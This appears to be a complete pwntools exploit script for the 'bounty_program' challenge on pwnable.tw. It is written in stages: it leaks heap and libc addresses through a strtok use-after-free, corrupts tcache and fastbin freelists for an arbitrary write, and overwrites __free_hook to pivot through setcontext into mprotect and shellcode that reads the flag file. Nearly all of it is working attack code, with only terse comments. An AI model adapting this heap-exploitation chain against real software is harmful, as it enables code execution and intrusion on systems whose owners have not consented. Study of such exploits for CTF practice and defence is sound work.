from pwn import *

exe = context.binary = ELF('./bounty_program')
libc = ELF('libc.so.6')

host = args.HOST or 'chall.pwnable.tw'
port = 10208

envname = b'AAA'
envval = b''

r = remote(host, port)
r.sendlineafter(b'Name:', envname)
r.sendlineafter(b'Value:', envval)


def leak(delim, bits=64):
    bytesize = 8 if bits == 64 else 4
    packer = u64 if bits == 64 else u32
    if isinstance(delim, int):
        data = r.recvn(delim)
    else:
        data = r.recvuntil(delim, drop=True)
    return packer(data.ljust(bytesize, b'\x00'))


'''def p(msg, x):
    info('{}: {:#x}'.format(msg, x))

'''
prompt = b'Your choice: '


def m(n):
    r.sendlineafter(prompt, str(n).encode())


def add_user(name, pw, contact):
    assert len(name) < 0x1f, 'name too long'
    assert len(name) < 0x10, 'pass too long'
    assert len(name) < 0x20, 'contact too long'
    m(2)
    r.sendafter(b':', name)
    r.sendafter(b':', pw)
    r.sendafter(b':', contact)


def login(name, pw):
    m(1)
    r.sendafter(b':', name)
    r.sendafter(b':', pw)


def bounty_menu():
    m(1)


def print_products():
    m(3)


def change_contact(data):
    m(4)
    r.sendafter(b':', data)


def main_menu():
    m(0)


def add_product(name, company, comment):
    assert len(name) < 0x30, 'name too long'
    assert len(company) < 0x20, 'company too long'
    assert len(comment) < 0x10, 'comment too long'
    m(1)
    r.sendafter(b'Product:', name)
    r.sendafter(b'Company:', company)
    r.sendafter(b'Comment:', comment)


def add_type(size, data, prices):
    assert size == -1 or len(data) < size, 'data too long'
    m(2)
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendafter(b'Type:', data)
    for price in prices:
        r.sendlineafter(b'Price:', str(price).encode())


def remove_type(size, data):
    assert len(data) < size, 'data too long'
    m(4)
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendafter(b'Type:', data)


def submit_report(pid, type, title, id, descsize, desc):
    assert len(title) < 0xff, 'title too long'
    assert len(desc) < descsize, 'desc too long'
    m(3)
    r.sendlineafter(b'ID:', str(pid).encode())
    r.sendlineafter(b'Type:', str(type).encode())
    r.sendafter(b'Title:', title)
    r.sendlineafter(b'ID:', str(id).encode())
    r.sendlineafter(b'descripton:', str(descsize).encode())
    r.sendafter(b'Descripton:', desc)


def modify_report(pid, id, title, descsize, desc):
    m(5)
    r.sendlineafter(b'Product ID:', str(pid).encode())
    r.sendlineafter(b'Bug ID:', str(id).encode())
    r.sendafter(b'Title:', title)
    r.sendlineafter(b'descripton:', str(descsize).encode())
    r.sendafter(b'Descripton:', desc)
    r.sendlineafter(b'? ', b'n')

with log.progress("Stage 1: leak heap pointer") as p:
    add_user(b'A', b'B', b'C')
    login(b'A', b'B')
    bounty_menu()

    #info('Stage 1: Leak heap pointer')

    # fill tcache[0x60]
    for _ in range(7):
        add_type(0x58, b'\x00', [])

    # move strtok()s "olds" to just before `char *company` in
    # in a virtual overlapping "struct Product"
    add_type(0x58, b'A' * 48, [1])

    # re-use chunk for struct Product
    add_product(b'victim', b'Q', b'R')

    # trigger strtok() UAF
    add_type(-1, b'', [])
    r.recvuntil(b'type: ')
    heap_leak = leak(b'\n')
    #p('heap_leak', heap_leak)
    p.success(hex(heap_leak))
    if heap_leak >> 40 != 0x55 and heap_leak >> 40 != 0x56:
        error('bad heap leak')
    r.sendlineafter(b'Price:', b'1')

with log.progress("Stage 2: leak libc pointer") as p:
    #info('Stage 2: Leak libc pointer')

    # fill tcache[0xa0]
    for _ in range(7):
        add_type(0x98, b'\x00', [])

    # setup "olds" to a bk ptr of 0xa0 chunk
    add_type(0x98, b'A' * 8 + b'\x00', [1])

    # strtok UAF again
    add_type(-1, b'', [])
    r.recvuntil(b'type: ')
    libc_leak = leak(b'\n')
    if libc_leak >> 40 != 0x7f:
        error('bad libc leak')

    log.info(f'libc_leak {hex(libc_leak)}')
    if libc_leak & 0xff == 0x30:
        info('malloc_consolidate() version')
        libc.address = libc_leak - 0x3ebd30
    else:
        # still in unsortbin
        libc.address = libc_leak - 0x3ebca0

    p.success(hex(libc.address))
    r.sendlineafter(b'Price:', b'1')

with log.progress("Stage 3: Aligning heap") as p:
    #info('Stage 3: Aligning heap')

    report_sz = 0x150
    cur_top = heap_leak + 0x590
    target_align = 0xff20
    pad_needed = target_align - (cur_top & 0xffff)
    pad_needed += 0x10000

    desc_len = pad_needed - report_sz - 0x8
    victim = cur_top + pad_needed + 0x10

    log.info(f'cur_top: {hex(cur_top)}')
    log.info(f'pad_needed: {hex(pad_needed)}')
    log.info(f'desc_len: {hex(desc_len)}')
    log.info(f'victim: {hex(victim)}')

    submit_report(0, 0, b'padder11\n', 11, desc_len, b'paddder11\n')

    # allocate victim
    victim_desc_len = 0x2c00 - 0xa0 - 0x70
    submit_report(0, 0, b'victim22\n', 22, victim_desc_len, b'victim22\n')

    # make room in vuln array; need to move chunks between fastbin and tcache
    remove_type(0x98, b'XSS')
    remove_type(0x98, b'DoS')
    remove_type(0x98, b'A' * 48)
    remove_type(0x98, b'A' * 8)
    remove_type(0x98, b'\x00')
    remove_type(0x98, p64(heap_leak))
    p.success()


with log.progress("Stage 4: Allocating chunk @ 0x2c10") as p:
    # info('Stage 4: Allocating chunk @ 0x2c10')
    add_type(0x98, b'v' * 0x58, [3])
    add_type(0x98, b'u' * 0x58, [4])
    p.success()

with log.progress("Stage 5: Preparing bins and freelists") as p:
# info('Stage 5: Preparing bins and freelists')

    [add_type(0x68, b'\x00', []) for _ in range(7)]

    # shrink description to free up and large chunk
    modify_report(0, 22, fit({
        0xe0: 0,
        0xe8: 0x71,
    }), victim_desc_len - 0xa0, fit({
        0: b'vict22\n',
        0x8: 0x21,
        0x28: 0x21,
    }, filler=b'\x00'))

    # moving target chunks into place
    remove_type(0x98, b'u' * 0x58)

    # pop two tcache[0x70]
    add_type(0x98, b'n' * 0x58, [99])
    add_type(0x98, b'm' * 0x58, [99])

    remove_type(0x98, b'v' * 0x58)
    p.success()

with log.progress("Stage 6: Corrupt freelist") as p:

# info('Stage 6: Corrupt freelist')

    # set olds to start of fd ptr
    add_type(0x68, b'\x00', [])

    # trigger UAF to change 2c to 00
    add_type(-1, b'', [8, 9])
    p.success()

with log.progress("Stage 7: Groom freelist and tcache to get overlap at head") as p:
# info('Stage 7: Groom freelist and tcache to get overlap at head')

    # make a chunk for later modify_report()
    modify_report(0, 11, b'padder11', desc_len - 0x1000, b'A\n')

    # pop top tcache[0x70]
    add_type(0x68, b'T' * 0x58, [6])

    # pop overlapping chunk
    add_type(0x68, b'O' * 0x58, [6])

    # fill tcache
    remove_type(0x98, b'T' * 0x58)
    remove_type(0x98, b'n' * 0x58)
    p.success()

with log.progress("Stage 8: Free root account to get write prim") as p:
# info('Stage 8: Free root account to get write prim')

    # put overlapping chunk in fastbin[0x70]
    remove_type(0x98, b'O' * 0x58)

    # ready to corrupt Report!
    root_account = heap_leak - 0x3f0
    log.info(f'root_account: {hex(root_account)}')

    # corrupt victim Report
    add_type(0x68, fit({
        0x0: 0,
        # user ptr
        0x10: root_account,
        # description len
        0x18: 0x2020,
        # bug_id
        0x20: 1337,
        # description
        0x28: root_account,
    }, filler=b'\x00'), [])

    # free root user -> unsortbin
    modify_report(0, 1337, b'victim22', 0xfd8, b'A')

    # move from small to fastbins
    add_type(0x68, b'\x00', [])
    add_type(0x58, b'\x00', [])


    # arbitrary write
    def w64(addr, what):
        add_type(0x58, fit({
            # 0x0: 'hello\n',
            0x38: addr,
        }, filler=b'\x00'), [])
        # pause()
        main_menu()
        change_contact(what)
        bounty_menu()


    # corrupt victim Report
    add_type(0x68, fit({
        0x0: 0,
        # user ptr
        0x10: root_account,
        # description len
        0x18: 0x2020,
        # bug_id
        0x20: 1337,
        # description
        0x28: victim + 0x40,
    }, filler=b'\x00'), [])

    # make tcache[0x20] pointing to free_hook
    tcache_20 = heap_leak - 0x8f0
    w64(tcache_20, p64(libc.symbols['__free_hook'])[:6])

    # alloc over free_hook, write context + shcode to heap
    here = victim + 0x3070
    log.info(f'rop: {hex(here)}')
    add_type(0x2000, fit({
        0x0: p64(libc.symbols['setcontext'] + 53),
        0x8: here + 0xc0,
        # 0x8: b'c'*8,

        # setcontext
        0x48: [
            # r12-r15
            0x12, 0x13, 0x14, 0x15,
            # rdi, rsi, rbp
            (here + 0xc0) & 0xfffffffffffff000,
            0x1000,
            0x0,
            # rbx, rdx, _, rcx
            0x0, 0x7, 0x0, 0x0,

            # rsp
            here + 0x8,
            # pc
            libc.symbols['mprotect']
        ],

        0xc0: asm(
            'sub rsp, 0x200\n' +
            shellcraft.open('/home/bounty_program/flag', 0, 0) +
            '''
            mov edi, eax
            mov rsi, rsp
            mov rdx, 0x100
            mov eax, 0
            syscall
            mov edi, 1
            mov eax, 1
            syscall
            ''' +
            shellcraft.exit(0)
            # shellcraft.sendfile(1, 4, 0, 0xb0)
        ),

    }, filler=b'\x00'), [1])

    '''r.recvuntil(b'FLAG')
    flag = r.recvline().decode()
    p.success("FLAG" + flag)'''
    r.interactive()
